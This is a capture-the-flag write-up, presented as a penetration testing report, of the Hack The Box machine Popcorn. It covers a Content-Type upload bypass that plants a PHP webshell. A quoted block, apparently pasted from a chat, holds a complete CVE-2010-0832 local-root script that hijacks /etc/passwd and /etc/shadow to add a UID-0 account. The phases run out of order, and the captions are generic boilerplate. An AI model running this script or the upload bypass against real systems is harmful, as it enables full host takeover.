---
title: "OffSec Assessment: Popcorn (Hack The Box) — Penetration Testing Report"
published: true
description: "Comprehensive offensive security assessment and penetration testing report for Popcorn (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
tags: cybersecurity, hackthebox, pentesting, infosec
series: "HackTheBox Enterprise Assessments"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_01.png"
---

# Offensive Security Assessment Report: Popcorn

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Popcorn** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** Torrent Hoster File Upload (Content-Type Bypass)
* **Privilege Escalation Vector:** PAM MOTD Local Root (CVE-2010-0832)
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | Popcorn |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty Rating** | Medium |
| **Associated CVE(s)** | CVE-2010-0832 |
| **Initial Foothold Vector** | Torrent Hoster File Upload (Content-Type Bypass) |
| **Privilege Escalation Vector** | PAM MOTD Local Root (CVE-2010-0832) |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: Torrent Hoster File Upload (Content-Type Bypass)
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: PAM MOTD Local Root (CVE-2010-0832)
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

---

### Phase 1: Reconnaissance & Port Scanning

El escaneo revela 2 puertos TCP abiertos: 22 (SSH) y 80 (HTTP Apache).


![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_01.png)
* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.


### Phase 2: Vulnerability Analysis & Attack Surface Mapping

Mediante directory fuzzing se descubre `/torrent`, una aplicacion de **Torrent Hoster** que permite subir y compartir archivos torrent.


![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_02.png)
* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.


### Phase 3: Exploitation & Initial Foothold

La aplicacion filtra las subidas usando la cabecera **Content-Type**. Se sube un torrent valido y luego se modifica la imagen del screenshot, subiendo un archivo PHP malicioso interceptando la peticion con Burp Suite y cambiando el Content-Type a `image/png`.


![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_03.png)
* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_04.png)
* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_05.png)
* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.


Esto permite ejecutar comandos como **www-data** a traves del webshell PHP subido.


![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_06.png)
* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.


### Phase 5: Proof of Compromise & Flag Capture

#### User Proof Flag Verification


![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_07.png)
* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.


### Phase 4: Local Privilege Escalation & Host Dominance

El sistema es Ubuntu 9.10, vulnerable to **CVE-2010-0832** (PAM MOTD local root). This vulnerability permite a un usuario normal obtener ownership de archivos arbitrarios mediante un symlink race condition en el directorio `.cache` durante el login SSH. Se abusa de esto para obtener escritura en `/etc/passwd` y `/etc/shadow`, creando un usuario con UID 0 y obteniendo shell como root.


![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_08.png)
* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.


#### Root / System Proof Flag Verification


![step_09.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_09.png)
* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.



![step_10.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/popcorn/images/step_10.png)
* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.


> 
> 
> 
> ### 0) Arregla `authorized_keys` y permisos (como `www-data`)
> 
> ```bash
> bash
> CopiarEditar
> cd /var/www/.ssh
> # corrige nombre si lo rompiste sin querer
> [ -f authorized_keyssh ] && mv authorized_keyssh authorized_keys
> 
> # asegúrate de que exista y tenga la pública dentro
> [ -f authorized_keys ] || touch authorized_keys
> grep -F "$(cat hola.pub)" authorized_keys >/dev/null || cat hola.pub >> authorized_keys
> 
> # permisos estrictos
> chmod 700 /var/www/.ssh
> chmod 600 hola hola.pub authorized_keys
> chmod go-w /var/www
> 
> ```
> 
> Prueba que la clave entra (MUY importante especificar el usuario):
> 
> ```bash
> bash
> CopiarEditar
> ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
>     -o IdentitiesOnly=yes -i /var/www/.ssh/hola www-data@localhost true
> 
> ```
> 
> Si **pide password**, pasa a verbose:
> 
> ```bash
> bash
> CopiarEditar
> ssh -vvv -o IdentitiesOnly=yes -i /var/www/.ssh/hola www-data@localhost true
> 
> ```
> 
> (y pásame las líneas de `Offering public key` / `Authentication` si falla).
> 
> ---
> 
> ### 1) Reemplaza **TODO** tu `14339.sh` por esto
> 
> ```bash
> bash
> CopiarEditar
> #!/bin/bash
> # Ubuntu PAM MOTD local root (CVE-2010-0832) – versión usando clave existente
> 
> set -e
> 
> P='toor:x:0:0:root:/root:/bin/bash'
> S='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::'
> 
> echo "[*] Ubuntu PAM MOTD local root"
> 
> KEY="/var/www/.ssh/hola"
> 
> # prerequisitos básicos
> command -v ssh >/dev/null 2>&1 || { echo "[-] ssh requerido"; exit 1; }
> ps -u root | grep -q sshd || { echo "[-] sshd debe estar corriendo"; exit 1; }
> [ -r "$KEY" ] || { echo "[-] No puedo leer clave $KEY"; exit 1; }
> 
> backup() {
>     [ -e "$1" ] && [ -e "$1".bak ] && rm -rf "$1".bak
>     [ -e "$1" ] || return 0
>     mv "$1"{,.bak} || return 1
>     echo "[*] Backuped $1"
> }
> restore() {
>     [ -e "$1" ] && rm -rf "$1"
>     [ -e "$1".bak ] || return 0
>     mv "$1"{.bak,} || return 1
>     echo "[*] Restored $1"
> }
> own() {
>     [ -e ~/.cache ] && rm -rf ~/.cache
>     ln -s "$1" ~/.cache || return 1
>     echo "[*] spawn ssh"
>     ssh -o 'NoHostAuthenticationForLocalhost yes' \
>         -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
>         -o IdentitiesOnly=yes -i "$KEY" www-data@localhost true
>     [ -w "$1" ] || { echo "[-] Own $1 failed"; restore ~/.cache; exit 1; }
>     echo "[+] owned: $1"
> }
> 
> backup ~/.cache || { echo "[-] No pude hacer backup de ~/.cache"; exit 1; }
> own /etc/passwd && echo "$P" >> /etc/passwd
> own /etc/shadow && echo "$S" >> /etc/shadow
> restore ~/.cache || { echo "[-] No pude restaurar ~/.cache"; exit 1; }
> 
> echo "[+] Success! Usa password 'toor' para root (temporal)"
> su -c "sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \
>   chgrp shadow /etc/shadow; nscd -i passwd >/dev/null 2>&1 || true; bash" toor
> 
> ```
>

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (CVE-2010-0832).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Torrent Hoster File Upload (Content-Type Bypass)) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (PAM MOTD Local Root (CVE-2010-0832)) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
